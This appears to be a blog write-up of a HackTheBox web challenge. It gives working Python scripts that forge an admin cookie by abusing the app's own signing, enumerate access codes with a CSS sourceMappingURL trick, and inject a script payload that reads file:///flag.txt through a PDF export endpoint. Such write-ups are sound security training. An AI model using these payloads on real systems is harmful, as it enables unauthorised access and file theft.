
![](https://cdn-images-1.medium.com/max/1000/1*9QqfmzcIUK8zM7fMGMi-WQ.png)

#### Challenge Scenario

---

Survivors find a battered laptop in the rubble. Powering it up, they discover a cryptic software interface from an ancient architecture firm, hinting at vital blueprints. They must crack its security protocols. Undeterred, they race against time.

check the website

![](https://cdn-images-1.medium.com/max/1000/1*3WJugxkFwd_pkBgfr_tMDg.png)

and zipfile

![](https://cdn-images-1.medium.com/max/1000/1*jRwKf8rkCsgRM_TFb6IOBg.png)

so register and login

![](https://cdn-images-1.medium.com/max/1000/1*MaecsZRRt077EtTzBD-RaQ.png)

![](https://cdn-images-1.medium.com/max/1000/1*T9JGgaSmUmA2B1ENDE6WVA.png)

we can make documents

![](https://cdn-images-1.medium.com/max/1000/1*Mpuw5eZ4ivz2JbUNwDuxCA.png)

maybe a xss

![](https://cdn-images-1.medium.com/max/1000/1*9sb2dbw2if8xg0yBzioq3w.png)

but we need more useful way

after check the zip

check our cookie

![](https://cdn-images-1.medium.com/max/1000/1*43sFEUIsh4UmATsT2HmYww.png)

base64 and what?

![](https://cdn-images-1.medium.com/max/1000/1*HFYPodjytPGq1NxiVlIVnA.png)

  

> **// 生成签名的核心函数  
> const signString = (s) =>  
>  crypto.createHmac(“sha256”, SECRET).update(s).digest(“hex”);**

> **// 生成完整 Cookie  
> const generateCookie = (username, id) => {  
>  // 1. 将用户数据转为 JSON 并 Base64 编码  
>  const stringifiedUser = btoa(JSON.stringify({ username, id }));  
>    
>  // 2. 用 HMAC-SHA256 对编码后的字符串进行签名  
>  const sig = signString(stringifiedUser);  
>    
>  // 3. 组合：编码数据 + 分隔符 + 签名  
>  return `${stringifiedUser}-${sig}`;  
> };**

signString,hum

luckily，it also sign the file

const sig = signString(stringifiedUser);

so,

![](https://cdn-images-1.medium.com/max/1000/1*BG3mG3pFpD6S84QdgqYGeA.png)

got 

eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9

![](https://cdn-images-1.medium.com/max/1000/1*5OhQrZMKd7bjuaB94saG1Q.png)

 got 

4fb37fb08b1f71e1a46ce7e1ecac8cd31ad3fd01a0a7bfeca7b7ab5fb300c845

so 

eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-4fb37fb08b1f71e1a46ce7e1ecac8cd31ad3fd01a0a7bfeca7b7ab5fb300c845

wo got admin

![](https://cdn-images-1.medium.com/max/1000/1*qaNlSIIbQ8LCptrxuo4hKw.png)

but nothing happpened right?

![](https://cdn-images-1.medium.com/max/1000/1*lTguo7JvSsw6cTXig2AkKw.png)

check the export api

![](https://cdn-images-1.medium.com/max/1000/1*Esxrf8BwU5EGB4XIU8FqNg.png)

check the logic and use the payload below

> **_import requests  
> from threading import Thread, Lock  
> import math  
> import re_**

> **_BASE_URL = “http://154.57.164.69:30588"  
> USER_COOKIE = “eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9–304567d68bda68293484023b1b1c1910c90e2740036b98e77f87fb8284e3aa09”_**

> **_START = 0  
> END = 10000  
> NUM_THREADS = 12  
> ALL_IDS = {f”{i:04d}” for i in range(10000)}  
> found_ids = set()  
> lock = Lock()_**

> **_def post_documents(start, end):  
>  session = requests.Session()  
>  session.cookies.set(“user”, USER_COOKIE)  
>  for i in range(start, end):  
>  padded = f”{i:04}”  
>  print(f”[Thread {start}-{end}] Posting document {padded}”)  
>  DOCUMENT_CONTENT = f”<a style=’background-image: url(/*# sourceMappingURL={padded} */);’>@slonser_</a>”  
>  try:  
>  doc_resp = session.post(f”{BASE_URL}/documents”, data={  
>  “content”: DOCUMENT_CONTENT  
>  }, allow_redirects=False, timeout=10)  
>  if doc_resp.status_code == 302:  
>  print(f”[+] {padded} posted successfully!”)  
>  else:  
>  print(f”[-] {padded} failed: {doc_resp.status_code} {doc_resp.text}”)  
>  except Exception as e:  
>  print(f”[!] Error posting {padded}: {e}”)_**

> **_def fetch_all_documents():  
>  session = requests.Session()  
>  session.cookies.set(“user”, USER_COOKIE)  
>  res = session.get(f”{BASE_URL}/documents”).text  
>  with open(‘out.txt’, ‘w’) as f:  
>  f.write(res)  
>  return res.splitlines()_**

> **_def process_lines(lines):  
>  local_ids = set()  
>  pattern = re.compile(r’sourceMappingURL=(\d{4})’)  
>  for line in lines:  
>  local_ids.update(pattern.findall(line))  
>  with lock:  
>  found_ids.update(local_ids)_**

> **_def main():  
>  total = END — START  
>  chunk = math.ceil(total / NUM_THREADS)  
>  threads = []_**

> **_for i in range(NUM_THREADS):  
>  thread_start = START + i * chunk  
>  thread_end = min(START + (i + 1) * chunk, END)  
>  t = Thread(target=post_documents, args=(thread_start, thread_end))  
>  threads.append(t)  
>  t.start()_**

> **_for t in threads:  
>  t.join()_**

> **_lines = fetch_all_documents()_**

> **_chunk_size = len(lines) // NUM_THREADS  
>  threads = []_**

> **_for i in range(NUM_THREADS):  
>  start = i * chunk_size  
>  end = None if i == NUM_THREADS — 1 else (i + 1) * chunk_size  
>  t = Thread(target=process_lines, args=(lines[start:end],))  
>  threads.append(t)  
>  t.start()_**

> **_for t in threads:  
>  t.join()_**

> **_missing = sorted(ALL_IDS — found_ids)  
>  print(f”[+] Total found: {len(found_ids)}”)  
>  print(f”[+] Missing ({len(missing)}):”)  
>  for mid in missing:  
>  print(mid)_**

> **_if __name__ == “__main__”:  
>  main()_**

![](https://cdn-images-1.medium.com/max/1000/1*QROKBM8g2LAm_pJ8Lxhvrg.png)

because of the netwrok,but we still make the target to only six

than use

> **_#!/usr/bin/env python3  
> “””  
> 并发测试6个候选访问码获取flag  
> “””_**

> **_import requests  
> import concurrent.futures  
> from concurrent.futures import ThreadPoolExecutor  
> import re  
> import sys_**

> **_BASE_URL = “http://154.57.164.69:30588"  
> USER_COOKIE = “eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9–304567d68bda68293484023b1b1c1910c90e2740036b98e77f87fb8284e3aa09”_**

> **_# 6个缺失的访问码  
> CANDIDATES = [‘0485’, ‘1509’, ‘2324’, ‘4875’, ‘8330’, ‘9031’]_**

> **_# SSRF payload读取flag  
> PAYLOAD = “””<script>  
> xhr = new XMLHttpRequest();  
> xhr.onload = function() {  
>  document.write(this.responseText);  
> };  
> xhr.open(“GET”, “file:///flag.txt”);  
> xhr.send();  
> </script>”””_**

> **_def test_code(code):  
>  “””测试单个访问码”””  
>  url = f”{BASE_URL}/document/debug/export”  
>    
>  headers = {  
>  “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36”,  
>  “Cookie”: f”user={USER_COOKIE}”,  
>  “Content-Type”: “application/x-www-form-urlencoded”  
>  }  
>    
>  data = {  
>  “access_pass”: code,  
>  “content”: PAYLOAD  
>  }  
>    
>  try:  
>  response = requests.post(url, headers=headers, data=data, timeout=30)  
>    
>  # 检查是否成功返回内容  
>  if response.status_code == 200:  
>  content_length = len(response.content)  
>  print(f”[*] 测试码 {code}: HTTP 200, 大小 {content_length} bytes”)  
>    
>  # 检查响应内容（可能是PDF或HTML）  
>  text_content = response.text  
>    
>  # 直接搜索flag  
>  flag_pattern = r’HTB\{[^}]+\}’  
>  flags = re.findall(flag_pattern, text_content)  
>  if flags:  
>  print(f”\n🎉🎉🎉 成功！访问码: {code}”)  
>  print(f”🏁 FLAG: {flags[0]}”)  
>  return code, True, flags[0]  
>    
>  # 保存PDF/文件  
>  filename = f”flag_{code}.pdf”  
>  with open(filename, “wb”) as f:  
>  f.write(response.content)  
>    
>  # 如果内容较大，可能是PDF  
>  if content_length > 1000:  
>  print(f” 📄 已保存到: {filename}”)  
>  # 尝试用简单方法提取PDF中的文本  
>  if b’HTB{‘ in response.content:  
>  match = re.search(rb’HTB\{[^}]+\}’, response.content)  
>  if match:  
>  flag = match.group(0).decode(‘utf-8’)  
>  print(f” 🏁 提取到FLAG: {flag}”)  
>  return code, True, flag  
>    
>  return code, False, None  
>    
>  elif response.status_code == 403:  
>  print(f”❌ 测试码 {code}: 403 Forbidden (错误密码)”)  
>  else:  
>  print(f”⚠️ 测试码 {code}: HTTP {response.status_code}”)  
>    
>  return code, False, None  
>    
>  except requests.exceptions.Timeout:  
>  print(f”⏰ 测试码 {code}: 超时”)  
>  except Exception as e:  
>  print(f”💥 测试码 {code}: 错误 — {str(e)[:50]}”)  
>    
>  return code, False, None_**

> **_def main():  
>  print(“=”*70)  
>  print(“🎯 并发测试6个候选访问码”)  
>  print(f”📍 目标: {BASE_URL}”)  
>  print(f”🔑 候选码: {‘, ‘.join(CANDIDATES)}”)  
>  print(“=”*70)  
>    
>  success_code = None  
>  success_flag = None  
>    
>  with ThreadPoolExecutor(max_workers=6) as executor:  
>  futures = {executor.submit(test_code, code): code for code in CANDIDATES}  
>    
>  for future in concurrent.futures.as_completed(futures):  
>  code, found, flag = future.result()  
>  if found:  
>  success_code = code  
>  success_flag = flag  
>  # 取消其他任务  
>  for f in futures:  
>  f.cancel()  
>  break  
>    
>  print(“\n” + “=”*70)  
>  if success_code:  
>  print(f”✅ 成功！正确的访问码是: {success_code}”)  
>  print(f”🏆 FLAG: {success_flag}”)  
>  print(f”\n💡 也可以查看生成的PDF文件: flag_{success_code}.pdf”)  
>  else:  
>  print(“❌ 所有候选码都失败了”)  
>  print(“\n可能的原因:”)  
>  print(“ 1. 正确的访问码不在候选列表中”)  
>  print(“ 2. Cookie已过期或权限不足”)  
>  print(“ 3. payload被WAF过滤”)  
>  print(“ 4. 接口路径需要调整”)  
>    
>  # 建议手动测试第一个候选码  
>  print(f”\n建议手动测试:”)  
>  print(f”curl -X POST {BASE_URL}/document/debug/export \\”)  
>  print(f” -H ‘Cookie: user={USER_COOKIE}’ \\”)  
>  print(f” -d ‘access_pass=0485&content={PAYLOAD}’ \\”)  
>  print(f” -v”)_**

> **_if __name__ == “__main__”:  
>  main()_**

![](https://cdn-images-1.medium.com/max/1000/1*98HXl7_b4N3vYub4gToGbQ.png)

  

![](https://cdn-images-1.medium.com/max/1000/1*v1tOLjWAvkicbyEZMW_-pg.png)

![](https://cdn-images-1.medium.com/max/1000/1*a6Nye-aAkhMvmr5hUHC46A.png)

yes!

HTB{F0rs33_3num3r3t3_F!nd_3XplOit}